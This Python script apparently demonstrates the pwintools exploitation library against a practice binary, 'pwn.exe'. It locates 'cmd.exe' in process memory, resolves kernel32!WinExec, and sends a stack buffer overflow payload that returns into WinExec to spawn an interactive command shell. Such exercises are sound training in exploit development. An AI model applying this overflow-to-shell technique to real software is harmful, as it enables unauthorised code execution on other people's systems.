import sys
import os.path
sys.path.append(os.path.abspath(__file__ + "\..\.."))
from pwintools import *

log.log_level = 'error'

# Run pwn.exe
proc = Process("pwn.exe")
log.info(proc)

# Search in memory cmd.exe
cmd_exe = proc.search(b"cmd.exe\0")
assert cmd_exe != 0, "Invalid binary cmd.exe not found"

log.info("0x{:x} : {}".format(cmd_exe, proc.leak(cmd_exe, 7)))

# Get WinExec address
WinExec = proc.get_proc_address('kernel32.dll', 'WinExec')   # Faster than proc.symbols['kernel32.dll']['WinExec']

log.info("kernel32!WinExec @ 0x{:x}".format(WinExec))

# Tests
log.debug(proc.recvline())
log.debug(proc.recvline())

# You can also Debug it in Python see PythonForWindows documentation
# proc.spawn_debugger(False)
# pwn.exe should spawn a cmd.exe prompt, we can interact with it !
proc.send(b'A' * 0x80 + p32(WinExec) + p32(0x42424242) + p32(cmd_exe) + b'A' * 4)
proc.interactive()
proc.close()
